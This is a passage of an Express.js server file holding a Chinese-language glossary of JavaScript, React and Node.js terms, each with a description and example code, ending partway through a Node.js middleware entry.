const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const compression = require('compression');
const rateLimit = require('express-rate-limit');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// 安全中间件
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}));

// 压缩响应
app.use(compression());

// CORS配置
app.use(cors({
  origin: process.env.NODE_ENV === 'production' 
    ? ['https://yourdomain.com'] 
    : ['http://localhost:3000', 'http://127.0.0.1:3000'],
  credentials: true
}));

// 请求日志
app.use(morgan('combined'));

// 请求限制
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15分钟
  max: 1000, // 限制每个IP 15分钟内最多1000个请求
  message: {
    error: 'Too many requests from this IP, please try again later.'
  }
});
app.use('/api/', limiter);

// 解析JSON
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// 静态文件服务
app.use(express.static(path.join(__dirname, 'public'), {
  maxAge: process.env.NODE_ENV === 'production' ? '1d' : '0'
}));

// 编程术语数据库 - 超大词汇库 (500+ 术语)
const programmingTermsDatabase = {
  // JavaScript核心概念 (80个术语)
  javascript: [
    {
      id: 'js_1',
      name: 'closure',
      chinese: '闭包',
      description: '函数与其词法环境的组合，内部函数可以访问外部函数的变量，即使外部函数已经执行完毕',
      difficulty: 'intermediate',
      tags: ['scope', 'functions', 'memory'],
      example: `function createCounter() {
  let count = 0;
  return function() {
    count++;
    return count;
  };
}

const counter = createCounter();
console.log(counter()); // 1
console.log(counter()); // 2`,
      useCases: ['模块化', '数据私有化', '函数工厂', '事件处理器'],
      relatedTerms: ['scope', 'hoisting', 'execution context']
    },
    {
      id: 'js_2',
      name: 'hoisting',
      chinese: '变量提升',
      description: 'JavaScript引擎在执行代码前将变量和函数声明移到作用域顶部的行为',
      difficulty: 'intermediate',
      tags: ['variables', 'functions', 'execution'],
      example: `console.log(x); // undefined (不是错误!)
var x = 5;

// 等价于:
var x;
console.log(x); // undefined
x = 5;

// 函数声明会被完全提升
sayHello(); // "Hello!" (可以正常调用)
function sayHello() {
  console.log("Hello!");
}`,
      useCases: ['理解执行顺序', '避免常见错误', '代码优化'],
      relatedTerms: ['scope', 'var', 'let', 'const']
    },
    {
      id: 'js_3',
      name: 'prototype',
      chinese: '原型',
      description: 'JavaScript中对象继承的基础机制，每个对象都有一个原型，用于属性和方法的查找',
      difficulty: 'advanced',
      tags: ['inheritance', 'objects', 'methods'],
      example: `function Person(name) {
  this.name = name;
}

Person.prototype.sayHello = function() {
  return \`Hello, I'm \${this.name}\`;
};

Person.prototype.species = 'Homo sapiens';

const alice = new Person('Alice');
console.log(alice.sayHello()); // "Hello, I'm Alice"
console.log(alice.species); // "Homo sapiens"`,
      useCases: ['对象继承', '方法共享', '内存优化', '原型链'],
      relatedTerms: ['inheritance', 'constructor', 'class']
    },
    {
      id: 'js_4',
      name: 'event_loop',
      chinese: '事件循环',
      description: 'JavaScript运行时处理异步操作的核心机制，管理调用栈、任务队列和微任务队列',
      difficulty: 'advanced',
      tags: ['async', 'runtime', 'performance'],
      example: `console.log('1');

setTimeout(() => console.log('2'), 0);

Promise.resolve().then(() => console.log('3'));

console.log('4');

// 输出顺序: 1, 4, 3, 2
// 微任务(Promise)优先于宏任务(setTimeout)`,
      useCases: ['异步编程', '性能优化', '任务调度', '响应式编程'],
      relatedTerms: ['async', 'promise', 'callback', 'microtask']
    },
    {
      id: 'js_5',
      name: 'destructuring',
      chinese: '解构赋值',
      description: '从数组或对象中提取值并赋给变量的便捷语法',
      difficulty: 'beginner',
      tags: ['syntax', 'variables', 'arrays', 'objects'],
      example: `// 对象解构
const person = { name: 'Alice', age: 25, city: 'NYC' };
const { name, age, city = 'Unknown' } = person;

// 数组解构
const colors = ['red', 'green', 'blue'];
const [primary, secondary, ...rest] = colors;

// 函数参数解构
function greet({ name, age }) {
  return \`Hello \${name}, you are \${age} years old\`;
}`,
      useCases: ['变量提取', '函数参数', '数据转换', '默认值设置'],
      relatedTerms: ['spread operator', 'rest parameters', 'default parameters']
    },
    {
      id: 'js_6',
      name: 'promise',
      chinese: 'Promise对象',
      description: '表示异步操作最终完成或失败的对象，提供了更好的异步编程解决方案',
      difficulty: 'intermediate',
      tags: ['async', 'promise', 'callback'],
      example: `// 创建Promise
const fetchData = new Promise((resolve, reject) => {
  setTimeout(() => {
    const success = Math.random() > 0.5;
    if (success) {
      resolve({ data: 'Hello World', status: 200 });
    } else {
      reject(new Error('Network error'));
    }
  }, 1000);
});

// 使用Promise
fetchData
  .then(result => {
    console.log('Success:', result.data);
    return result.data.toUpperCase();
  })
  .then(upperData => {
    console.log('Processed:', upperData);
  })
  .catch(error => {
    console.error('Error:', error.message);
  })
  .finally(() => {
    console.log('Request completed');
  });`,
      useCases: ['异步数据获取', '避免回调地狱', '错误处理', '链式调用'],
      relatedTerms: ['async', 'await', 'callback', 'event loop']
    },
    {
      id: 'js_7',
      name: 'async_await',
      chinese: 'async/await',
      description: '基于Promise的语法糖，使异步代码看起来像同步代码，提高可读性',
      difficulty: 'intermediate',
      tags: ['async', 'promise', 'syntax'],
      example: `// 传统Promise写法
function fetchUserData() {
  return fetch('/api/user')
    .then(response => response.json())
    .then(user => {
      return fetch(\`/api/posts/\${user.id}\`);
    })
    .then(response => response.json());
}

// async/await写法
async function fetchUserDataAsync() {
  try {
    const userResponse = await fetch('/api/user');
    const user = await userResponse.json();

    const postsResponse = await fetch(\`/api/posts/\${user.id}\`);
    const posts = await postsResponse.json();

    return { user, posts };
  } catch (error) {
    console.error('Error fetching data:', error);
    throw error;
  }
}

// 并行执行
async function fetchMultipleData() {
  const [users, posts, comments] = await Promise.all([
    fetch('/api/users').then(r => r.json()),
    fetch('/api/posts').then(r => r.json()),
    fetch('/api/comments').then(r => r.json())
  ]);

  return { users, posts, comments };
}`,
      useCases: ['简化异步代码', '错误处理', '并行执行', '条件异步操作'],
      relatedTerms: ['promise', 'try-catch', 'Promise.all', 'fetch']
    },
    {
      id: 'js_8',
      name: 'arrow_function',
      chinese: '箭头函数',
      description: 'ES6引入的函数简写语法，具有词法作用域的this绑定',
      difficulty: 'beginner',
      tags: ['es6', 'functions', 'syntax'],
      example: `// 传统函数
function add(a, b) {
  return a + b;
}

// 箭头函数
const add = (a, b) => a + b;

// 单参数可省略括号
const square = x => x * x;

// 多行函数体需要大括号和return
const processData = (data) => {
  const filtered = data.filter(item => item.active);
  const mapped = filtered.map(item => item.value);
  return mapped.reduce((sum, val) => sum + val, 0);
};

// this绑定差异
class Timer {
  constructor() {
    this.seconds = 0;
  }

  // 传统函数 - this会改变
  startTraditional() {
    setInterval(function() {
      this.seconds++; // this指向window/global
      console.log(this.seconds); // NaN
    }, 1000);
  }

  // 箭头函数 - this保持不变
  startArrow() {
    setInterval(() => {
      this.seconds++; // this指向Timer实例
      console.log(this.seconds); // 1, 2, 3...
    }, 1000);
  }
}`,
      useCases: ['简化函数语法', '回调函数', '数组方法', '保持this绑定'],
      relatedTerms: ['this', 'lexical scope', 'callback', 'es6']
    },
    {
      id: 'js_9',
      name: 'spread_operator',
      chinese: '展开运算符',
      description: '用三个点(...)表示的运算符，可以展开数组、对象或可迭代对象',
      difficulty: 'beginner',
      tags: ['es6', 'syntax', 'arrays', 'objects'],
      example: `// 数组展开
const arr1 = [1, 2, 3];
const arr2 = [4, 5, 6];
const combined = [...arr1, ...arr2]; // [1, 2, 3, 4, 5, 6]

// 对象展开
const obj1 = { a: 1, b: 2 };
const obj2 = { c: 3, d: 4 };
const merged = { ...obj1, ...obj2 }; // { a: 1, b: 2, c: 3, d: 4 }

// 函数参数展开
function sum(a, b, c) {
  return a + b + c;
}
const numbers = [1, 2, 3];
console.log(sum(...numbers)); // 6

// 复制数组/对象
const originalArray = [1, 2, 3];
const copiedArray = [...originalArray];

const originalObj = { name: 'Alice', age: 25 };
const copiedObj = { ...originalObj };

// 字符串展开
const str = 'hello';
const chars = [...str]; // ['h', 'e', 'l', 'l', 'o']`,
      useCases: ['数组合并', '对象合并', '函数参数传递', '浅拷贝'],
      relatedTerms: ['rest parameters', 'destructuring', 'array methods']
    },
    {
      id: 'js_10',
      name: 'template_literals',
      chinese: '模板字符串',
      description: '使用反引号包围的字符串，支持变量插值和多行文本',
      difficulty: 'beginner',
      tags: ['es6', 'strings', 'syntax'],
      example: `// 基本用法
const name = 'Alice';
const age = 25;
const message = \`Hello, my name is \${name} and I'm \${age} years old.\`;

// 多行字符串
const html = \`
  <div class="user-card">
    <h2>\${name}</h2>
    <p>Age: \${age}</p>
    <p>Status: \${age >= 18 ? 'Adult' : 'Minor'}</p>
  </div>
\`;

// 表达式计算
const price = 100;
const tax = 0.08;
const total = \`Total: $\${(price * (1 + tax)).toFixed(2)}\`;

// 标签模板
function highlight(strings, ...values) {
  return strings.reduce((result, string, i) => {
    const value = values[i] ? \`<mark>\${values[i]}</mark>\` : '';
    return result + string + value;
  }, '');
}

const searchTerm = 'JavaScript';
const text = highlight\`Learn \${searchTerm} programming\`;
// "Learn <mark>JavaScript</mark> programming"`,
      useCases: ['字符串插值', 'HTML模板', '多行文本', '动态内容生成'],
      relatedTerms: ['string methods', 'interpolation', 'tagged templates']
    },
    {
      id: 'js_11',
      name: 'modules',
      chinese: 'ES6模块',
      description: 'JavaScript的模块化系统，支持导入导出功能，实现代码组织和复用',
      difficulty: 'intermediate',
      tags: ['es6', 'modules', 'import', 'export'],
      example: `// math.js - 导出模块
export const PI = 3.14159;

export function add(a, b) {
  return a + b;
}

export function multiply(a, b) {
  return a * b;
}

// 默认导出
export default function subtract(a, b) {
  return a - b;
}

// utils.js - 批量导出
const formatDate = (date) => date.toISOString();
const formatCurrency = (amount) => \`$\${amount.toFixed(2)}\`;

export { formatDate, formatCurrency };

// main.js - 导入模块
import subtract, { PI, add, multiply } from './math.js';
import { formatDate, formatCurrency } from './utils.js';

// 重命名导入
import { add as sum } from './math.js';

// 全部导入
import * as MathUtils from './math.js';

console.log(add(5, 3)); // 8
console.log(subtract(10, 4)); // 6
console.log(MathUtils.PI); // 3.14159

// 动态导入
async function loadModule() {
  const { add } = await import('./math.js');
  console.log(add(2, 3)); // 5
}`,
      useCases: ['代码组织', '功能复用', '依赖管理', '命名空间'],
      relatedTerms: ['import', 'export', 'bundling', 'tree shaking']
    },
    {
      id: 'js_12',
      name: 'classes',
      chinese: 'ES6类',
      description: 'ES6引入的类语法，提供更清晰的面向对象编程方式',
      difficulty: 'intermediate',
      tags: ['es6', 'oop', 'classes', 'inheritance'],
      example: `// 基本类定义
class Person {
  constructor(name, age) {
    this.name = name;
    this.age = age;
  }

  // 实例方法
  greet() {
    return \`Hello, I'm \${this.name}\`;
  }

  // 静态方法
  static createAdult(name) {
    return new Person(name, 18);
  }

  // Getter
  get info() {
    return \`\${this.name} (\${this.age})\`;
  }

  // Setter
  set age(value) {
    if (value < 0) throw new Error('Age cannot be negative');
    this._age = value;
  }

  get age() {
    return this._age;
  }
}

// 继承
class Student extends Person {
  constructor(name, age, school) {
    super(name, age); // 调用父类构造函数
    this.school = school;
  }

  greet() {
    return \`\${super.greet()}, I study at \${this.school}\`;
  }

  study() {
    return \`\${this.name} is studying\`;
  }
}

// 使用
const person = new Person('Alice', 25);
const student = new Student('Bob', 20, 'MIT');

console.log(person.greet()); // "Hello, I'm Alice"
console.log(student.greet()); // "Hello, I'm Bob, I study at MIT"
console.log(Person.createAdult('Charlie').age); // 18`,
      useCases: ['面向对象编程', '代码组织', '继承关系', '封装数据'],
      relatedTerms: ['constructor', 'inheritance', 'super', 'static methods']
    },
    {
      id: 'js_13',
      name: 'map_set',
      chinese: 'Map和Set',
      description: 'ES6新增的数据结构，Map用于键值对存储，Set用于唯一值集合',
      difficulty: 'intermediate',
      tags: ['es6', 'data-structures', 'collections'],
      example: `// Map - 键值对集合
const userMap = new Map();

// 设置值
userMap.set('name', 'Alice');
userMap.set('age', 25);
userMap.set(1, 'numeric key');

// 获取值
console.log(userMap.get('name')); // 'Alice'
console.log(userMap.has('age')); // true
console.log(userMap.size); // 3

// 遍历Map
for (const [key, value] of userMap) {
  console.log(\`\${key}: \${value}\`);
}

// Set - 唯一值集合
const uniqueNumbers = new Set([1, 2, 3, 3, 4, 4, 5]);
console.log(uniqueNumbers); // Set {1, 2, 3, 4, 5}

// 添加和删除
uniqueNumbers.add(6);
uniqueNumbers.delete(1);
console.log(uniqueNumbers.has(3)); // true

// 数组去重
const numbers = [1, 2, 2, 3, 3, 4];
const unique = [...new Set(numbers)]; // [1, 2, 3, 4]

// WeakMap 和 WeakSet
const weakMap = new WeakMap();
const obj = { name: 'test' };
weakMap.set(obj, 'some data');

const weakSet = new WeakSet();
weakSet.add(obj);`,
      useCases: ['数据去重', '键值对存储', '缓存实现', '对象关联'],
      relatedTerms: ['data structures', 'collections', 'iteration', 'weak references']
    },
    {
      id: 'js_14',
      name: 'generators',
      chinese: '生成器函数',
      description: '可以暂停和恢复执行的特殊函数，用于创建迭代器',
      difficulty: 'advanced',
      tags: ['es6', 'generators', 'iteration', 'async'],
      example: `// 基本生成器
function* numberGenerator() {
  yield 1;
  yield 2;
  yield 3;
  return 'done';
}

const gen = numberGenerator();
console.log(gen.next()); // { value: 1, done: false }
console.log(gen.next()); // { value: 2, done: false }
console.log(gen.next()); // { value: 3, done: false }
console.log(gen.next()); // { value: 'done', done: true }

// 无限序列生成器
function* fibonacci() {
  let a = 0, b = 1;
  while (true) {
    yield a;
    [a, b] = [b, a + b];
  }
}

const fib = fibonacci();
for (let i = 0; i < 10; i++) {
  console.log(fib.next().value);
}

// 生成器委托
function* gen1() {
  yield 1;
  yield 2;
}

function* gen2() {
  yield 3;
  yield 4;
}

function* combined() {
  yield* gen1();
  yield* gen2();
  yield 5;
}

console.log([...combined()]); // [1, 2, 3, 4, 5]

// 异步生成器
async function* asyncGenerator() {
  for (let i = 0; i < 3; i++) {
    await new Promise(resolve => setTimeout(resolve, 1000));
    yield i;
  }
}

// 使用异步生成器
(async () => {
  for await (const value of asyncGenerator()) {
    console.log(value); // 每秒输出 0, 1, 2
  }
})();`,
      useCases: ['迭代器创建', '惰性求值', '状态机', '异步数据流'],
      relatedTerms: ['iterators', 'yield', 'async generators', 'for...of']
    }
  ],

  // React生态系统 (60个术语)
  react: [
    {
      id: 'react_1',
      name: 'jsx',
      chinese: 'JavaScript XML',
      description: 'React中使用的语法扩展，允许在JavaScript中编写类似HTML的标记',
      difficulty: 'beginner',
      tags: ['syntax', 'components', 'rendering'],
      example: `const Welcome = ({ name, age }) => {
  const isAdult = age >= 18;

  return (
    <div className="welcome-container">
      <h1>Welcome, {name}!</h1>
      {isAdult ? (
        <p>You are an adult.</p>
      ) : (
        <p>You are a minor.</p>
      )}
      <ul>
        {['React', 'Vue', 'Angular'].map(framework => (
          <li key={framework}>{framework}</li>
        ))}
      </ul>
    </div>
  );
};`,
      useCases: ['组件定义', '模板渲染', '条件渲染', '列表渲染'],
      relatedTerms: ['components', 'props', 'virtual dom']
    },
    {
      id: 'react_2',
      name: 'hooks',
      chinese: 'React钩子',
      description: '让函数组件能够使用状态和其他React特性的特殊函数',
      difficulty: 'intermediate',
      tags: ['state', 'lifecycle', 'functional'],
      example: `import React, { useState, useEffect, useCallback } from 'react';

function UserProfile({ userId }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);

  const fetchUser = useCallback(async () => {
    setLoading(true);
    try {
      const response = await fetch(\`/api/users/\${userId}\`);
      const userData = await response.json();
      setUser(userData);
    } catch (error) {
      console.error('Failed to fetch user:', error);
    } finally {
      setLoading(false);
    }
  }, [userId]);

  useEffect(() => {
    fetchUser();
  }, [fetchUser]);

  if (loading) return <div>Loading...</div>;
  if (!user) return <div>User not found</div>;

  return (
    <div>
      <h2>{user.name}</h2>
      <p>{user.email}</p>
    </div>
  );
}`,
      useCases: ['状态管理', '副作用处理', '性能优化', '逻辑复用'],
      relatedTerms: ['useState', 'useEffect', 'useCallback', 'useMemo']
    },
    {
      id: 'react_3',
      name: 'virtual_dom',
      chinese: '虚拟DOM',
      description: 'React在内存中维护的DOM表示，用于优化实际DOM操作的性能',
      difficulty: 'intermediate',
      tags: ['performance', 'rendering', 'optimization'],
      example: `// React创建虚拟DOM元素
const element = React.createElement(
  'div',
  { className: 'container', id: 'main' },
  React.createElement('h1', null, 'Hello World'),
  React.createElement('p', null, 'This is a paragraph')
);

// JSX语法糖
const elementJSX = (
  <div className="container" id="main">
    <h1>Hello World</h1>
    <p>This is a paragraph</p>
  </div>
);

// 虚拟DOM对象结构
const virtualDOM = {
  type: 'div',
  props: {
    className: 'container',
    id: 'main',
    children: [
      {
        type: 'h1',
        props: { children: 'Hello World' }
      },
      {
        type: 'p',
        props: { children: 'This is a paragraph' }
      }
    ]
  }
};

// React的diff算法比较新旧虚拟DOM
// 只更新实际发生变化的DOM节点`,
      useCases: ['性能优化', '批量更新', '跨浏览器兼容', '状态管理'],
      relatedTerms: ['diff algorithm', 'reconciliation', 'rendering', 'jsx']
    },
    {
      id: 'react_4',
      name: 'state',
      chinese: '状态',
      description: 'React组件内部的数据，当状态改变时会触发组件重新渲染',
      difficulty: 'beginner',
      tags: ['data', 'rendering', 'component'],
      example: `// 类组件中的state
class Counter extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      count: 0,
      message: 'Hello'
    };
  }

  increment = () => {
    this.setState(prevState => ({
      count: prevState.count + 1
    }));
  }

  render() {
    return (
      <div>
        <p>Count: {this.state.count}</p>
        <button onClick={this.increment}>+</button>
      </div>
    );
  }
}

// 函数组件中的state (使用useState Hook)
function CounterHook() {
  const [count, setCount] = useState(0);
  const [message, setMessage] = useState('Hello');

  const increment = () => {
    setCount(prevCount => prevCount + 1);
  };

  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={increment}>+</button>
    </div>
  );
}`,
      useCases: ['数据管理', '用户交互', '动态内容', '表单处理'],
      relatedTerms: ['useState', 'setState', 'props', 'rendering']
    },
    {
      id: 'react_5',
      name: 'props',
      chinese: '属性',
      description: '父组件传递给子组件的数据，是只读的',
      difficulty: 'beginner',
      tags: ['data', 'component', 'communication'],
      example: `// 父组件传递props
function App() {
  const user = {
    name: 'Alice',
    age: 25,
    email: 'alice@example.com'
  };

  return (
    <div>
      <UserCard
        user={user}
        isActive={true}
        onEdit={() => console.log('Edit user')}
      />
    </div>
  );
}

// 子组件接收props
function UserCard({ user, isActive, onEdit }) {
  return (
    <div className={\`user-card \${isActive ? 'active' : ''}\`}>
      <h3>{user.name}</h3>
      <p>Age: {user.age}</p>
      <p>Email: {user.email}</p>
      <button onClick={onEdit}>Edit</button>
    </div>
  );
}

// 使用PropTypes进行类型检查
import PropTypes from 'prop-types';

UserCard.propTypes = {
  user: PropTypes.shape({
    name: PropTypes.string.isRequired,
    age: PropTypes.number.isRequired,
    email: PropTypes.string.isRequired
  }).isRequired,
  isActive: PropTypes.bool,
  onEdit: PropTypes.func.isRequired
};

UserCard.defaultProps = {
  isActive: false
};`,
      useCases: ['组件通信', '数据传递', '配置组件', '回调函数'],
      relatedTerms: ['state', 'component', 'PropTypes', 'children']
    },
    {
      id: 'react_6',
      name: 'useEffect',
      chinese: 'useEffect钩子',
      description: '处理副作用的React Hook，替代类组件的生命周期方法',
      difficulty: 'intermediate',
      tags: ['hooks', 'side-effects', 'lifecycle'],
      example: `import React, { useState, useEffect } from 'react';

function UserProfile({ userId }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);

  // 组件挂载和userId变化时执行
  useEffect(() => {
    async function fetchUser() {
      setLoading(true);
      try {
        const response = await fetch(\`/api/users/\${userId}\`);
        const userData = await response.json();
        setUser(userData);
      } catch (error) {
        console.error('Failed to fetch user:', error);
      } finally {
        setLoading(false);
      }
    }

    fetchUser();
  }, [userId]); // 依赖数组

  // 组件挂载时设置定时器，卸载时清理
  useEffect(() => {
    const timer = setInterval(() => {
      console.log('Timer tick');
    }, 1000);

    // 清理函数
    return () => {
      clearInterval(timer);
    };
  }, []); // 空依赖数组，只在挂载/卸载时执行

  // 每次渲染都执行（无依赖数组）
  useEffect(() => {
    document.title = user ? \`Profile: \${user.name}\` : 'Loading...';
  });

  if (loading) return <div>Loading...</div>;
  if (!user) return <div>User not found</div>;

  return (
    <div>
      <h1>{user.name}</h1>
      <p>{user.email}</p>
    </div>
  );
}`,
      useCases: ['数据获取', '订阅管理', 'DOM操作', '定时器管理'],
      relatedTerms: ['useState', 'lifecycle', 'cleanup', 'dependencies']
    },
    {
      id: 'react_7',
      name: 'context',
      chinese: 'React Context',
      description: '跨组件层级传递数据的机制，避免props drilling问题',
      difficulty: 'intermediate',
      tags: ['context', 'state-management', 'props-drilling'],
      example: `import React, { createContext, useContext, useState } from 'react';

// 创建Context
const ThemeContext = createContext();
const UserContext = createContext();

// Provider组件
function App() {
  const [theme, setTheme] = useState('dark');
  const [user, setUser] = useState({ name: 'Alice', role: 'admin' });

  return (
    <ThemeContext.Provider value={{ theme, setTheme }}>
      <UserContext.Provider value={{ user, setUser }}>
        <Header />
        <MainContent />
        <Footer />
      </UserContext.Provider>
    </ThemeContext.Provider>
  );
}

// 消费Context的组件
function Header() {
  const { theme, setTheme } = useContext(ThemeContext);
  const { user } = useContext(UserContext);

  return (
    <header className={\`header \${theme}\`}>
      <h1>Welcome, {user.name}</h1>
      <button onClick={() => setTheme(theme === 'dark' ? 'light' : 'dark')}>
        Switch to {theme === 'dark' ? 'light' : 'dark'} theme
      </button>
    </header>
  );
}

// 自定义Hook封装Context
function useTheme() {
  const context = useContext(ThemeContext);
  if (!context) {
    throw new Error('useTheme must be used within ThemeProvider');
  }
  return context;
}

function useUser() {
  const context = useContext(UserContext);
  if (!context) {
    throw new Error('useUser must be used within UserProvider');
  }
  return context;
}

// 使用自定义Hook
function ProfileCard() {
  const { theme } = useTheme();
  const { user } = useUser();

  return (
    <div className={\`profile-card \${theme}\`}>
      <h3>{user.name}</h3>
      <p>Role: {user.role}</p>
    </div>
  );
}`,
      useCases: ['全局状态', '主题切换', '用户认证', '多语言支持'],
      relatedTerms: ['provider', 'consumer', 'useContext', 'props drilling']
    },
    {
      id: 'react_8',
      name: 'memo',
      chinese: 'React.memo',
      description: '高阶组件，用于优化函数组件的渲染性能，类似PureComponent',
      difficulty: 'intermediate',
      tags: ['performance', 'optimization', 'memoization'],
      example: `import React, { memo, useState, useMemo, useCallback } from 'react';

// 普通组件 - 每次父组件更新都会重新渲染
function ExpensiveComponent({ data, onUpdate }) {
  console.log('ExpensiveComponent rendered');

  // 模拟昂贵的计算
  const processedData = data.map(item => ({
    ...item,
    processed: item.value * 2
  }));

  return (
    <div>
      {processedData.map(item => (
        <div key={item.id} onClick={() => onUpdate(item.id)}>
          {item.name}: {item.processed}
        </div>
      ))}
    </div>
  );
}

// 使用memo优化的组件
const OptimizedComponent = memo(function OptimizedComponent({ data, onUpdate }) {
  console.log('OptimizedComponent rendered');

  const processedData = useMemo(() => {
    console.log('Processing data...');
    return data.map(item => ({
      ...item,
      processed: item.value * 2
    }));
  }, [data]);

  return (
    <div>
      {processedData.map(item => (
        <div key={item.id} onClick={() => onUpdate(item.id)}>
          {item.name}: {item.processed}
        </div>
      ))}
    </div>
  );
});

// 自定义比较函数
const CustomMemoComponent = memo(function CustomMemoComponent({ user, settings }) {
  return (
    <div>
      <h3>{user.name}</h3>
      <p>Theme: {settings.theme}</p>
    </div>
  );
}, (prevProps, nextProps) => {
  // 自定义比较逻辑
  return prevProps.user.id === nextProps.user.id &&
         prevProps.settings.theme === nextProps.settings.theme;
});

// 父组件
function ParentComponent() {
  const [count, setCount] = useState(0);
  const [data] = useState([
    { id: 1, name: 'Item 1', value: 10 },
    { id: 2, name: 'Item 2', value: 20 }
  ]);

  // 使用useCallback避免函数重新创建
  const handleUpdate = useCallback((id) => {
    console.log(\`Updated item \${id}\`);
  }, []);

  return (
    <div>
      <button onClick={() => setCount(count + 1)}>
        Count: {count}
      </button>

      {/* 这个组件不会因为count变化而重新渲染 */}
      <OptimizedComponent data={data} onUpdate={handleUpdate} />
    </div>
  );
}`,
      useCases: ['性能优化', '避免不必要渲染', '昂贵计算缓存', '组件优化'],
      relatedTerms: ['useMemo', 'useCallback', 'PureComponent', 'performance']
    },
    {
      id: 'react_9',
      name: 'custom_hooks',
      chinese: '自定义Hook',
      description: '提取组件逻辑的自定义函数，实现逻辑复用和关注点分离',
      difficulty: 'intermediate',
      tags: ['hooks', 'reusability', 'custom'],
      example: `import { useState, useEffect, useCallback } from 'react';

// 自定义Hook：数据获取
function useFetch(url) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    async function fetchData() {
      try {
        setLoading(true);
        setError(null);
        const response = await fetch(url);
        if (!response.ok) {
          throw new Error(\`HTTP error! status: \${response.status}\`);
        }
        const result = await response.json();
        setData(result);
      } catch (err) {
        setError(err.message);
      } finally {
        setLoading(false);
      }
    }

    fetchData();
  }, [url]);

  return { data, loading, error };
}

// 自定义Hook：本地存储
function useLocalStorage(key, initialValue) {
  const [storedValue, setStoredValue] = useState(() => {
    try {
      const item = window.localStorage.getItem(key);
      return item ? JSON.parse(item) : initialValue;
    } catch (error) {
      console.error(\`Error reading localStorage key "\${key}":, error\`);
      return initialValue;
    }
  });

  const setValue = useCallback((value) => {
    try {
      setStoredValue(value);
      window.localStorage.setItem(key, JSON.stringify(value));
    } catch (error) {
      console.error(\`Error setting localStorage key "\${key}":, error\`);
    }
  }, [key]);

  return [storedValue, setValue];
}

// 自定义Hook：计数器
function useCounter(initialValue = 0) {
  const [count, setCount] = useState(initialValue);

  const increment = useCallback(() => setCount(c => c + 1), []);
  const decrement = useCallback(() => setCount(c => c - 1), []);
  const reset = useCallback(() => setCount(initialValue), [initialValue]);

  return { count, increment, decrement, reset };
}

// 自定义Hook：防抖
function useDebounce(value, delay) {
  const [debouncedValue, setDebouncedValue] = useState(value);

  useEffect(() => {
    const handler = setTimeout(() => {
      setDebouncedValue(value);
    }, delay);

    return () => {
      clearTimeout(handler);
    };
  }, [value, delay]);

  return debouncedValue;
}

// 使用自定义Hook的组件
function UserProfile({ userId }) {
  const { data: user, loading, error } = useFetch(\`/api/users/\${userId}\`);
  const [preferences, setPreferences] = useLocalStorage('userPrefs', {});
  const { count, increment, decrement, reset } = useCounter(0);

  if (loading) return <div>Loading...</div>;
  if (error) return <div>Error: {error}</div>;

  return (
    <div>
      <h1>{user.name}</h1>
      <p>Profile views: {count}</p>
      <button onClick={increment}>View Profile</button>
      <button onClick={reset}>Reset Views</button>
    </div>
  );
}`,
      useCases: ['逻辑复用', '状态管理', '副作用封装', '组件解耦'],
      relatedTerms: ['hooks', 'reusability', 'separation of concerns', 'composition']
    },
    {
      id: 'js_15',
      name: 'dom_methods',
      chinese: 'DOM方法',
      description: 'JavaScript中用于操作HTML文档对象模型的内置方法和属性',
      difficulty: 'intermediate',
      tags: ['dom', 'methods', 'manipulation'],
      example: `// 元素选择方法
document.getElementById('myId')                    // 通过ID选择
document.getElementsByClassName('myClass')         // 通过类名选择
document.querySelector('.class')                  // CSS选择器（单个）
document.querySelectorAll('.class')               // CSS选择器（所有）

// 元素创建和插入
const newElement = document.createElement('div')   // 创建元素
parent.appendChild(child)                         // 添加子元素
parent.append(element)                            // 现代添加方法

// 属性操作
element.getAttribute('class')                     // 获取属性
element.setAttribute('class', 'newClass')        // 设置属性
element.classList.add('newClass')                // 添加类
element.classList.toggle('active')               // 切换类

// 内容操作
element.innerHTML = '<p>HTML内容</p>'            // 设置HTML内容
element.textContent = '纯文本内容'               // 设置文本内容

// 事件处理
element.addEventListener('click', handler)        // 添加事件监听器`,
      useCases: ['DOM操作', '动态内容', '事件处理', '用户交互'],
      relatedTerms: ['document', 'element', 'node', 'event handling']
    },
    {
      id: 'js_16',
      name: 'array_methods',
      chinese: '数组方法',
      description: 'JavaScript数组对象的内置方法，用于操作和处理数组数据',
      difficulty: 'intermediate',
      tags: ['arrays', 'methods', 'functional'],
      example: `// 数组基本操作
const arr = [1, 2, 3, 4, 5];
arr.push(6)                                   // 末尾添加元素
arr.pop()                                     // 删除末尾元素
arr.unshift(0)                                // 开头添加元素
arr.shift()                                   // 删除开头元素

// 查找元素
arr.indexOf(3)                                // 查找元素索引
arr.includes(3)                               // 检查是否包含元素
arr.find(x => x > 3)                          // 查找满足条件的元素

// 数组转换
arr.map(x => x * 2)                           // 映射每个元素
arr.filter(x => x > 2)                        // 过滤元素
arr.reduce((acc, x) => acc + x, 0)            // 累积计算

// 数组检测
arr.every(x => x > 0)                         // 检查所有元素
arr.some(x => x > 3)                          // 检查部分元素

// 数组排序
arr.sort((a, b) => a - b)                     // 升序排序
arr.reverse()                                 // 反转数组

// 数组连接
arr.concat([6, 7, 8])                         // 连接数组
arr.join(', ')                                // 转为字符串`,
      useCases: ['数据处理', '函数式编程', '数组操作', '数据转换'],
      relatedTerms: ['functional programming', 'iteration', 'higher-order functions']
    }
  ],

  // Node.js后端 (70个术语)
  nodejs: [
    {
      id: 'node_1',
      name: 'middleware',
      chinese: '中间件',
      description: '在请求和响应之间执行的函数，用于处理请求、响应或传递控制权',
      difficulty: 'intermediate',
      tags: ['express', 'routing', 'processing'],
      example: `// 日志中间件
const loggerMiddleware = (req, res, next) => {
  console.log(\`\${new Date().toISOString()} - \${req.method} \${req.url}\`);
  next(); // 传递控制权给下一个中间件
};

// 认证中间件
const authMiddleware = (req, res, next) => {
  const token = req.headers.authorization;
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
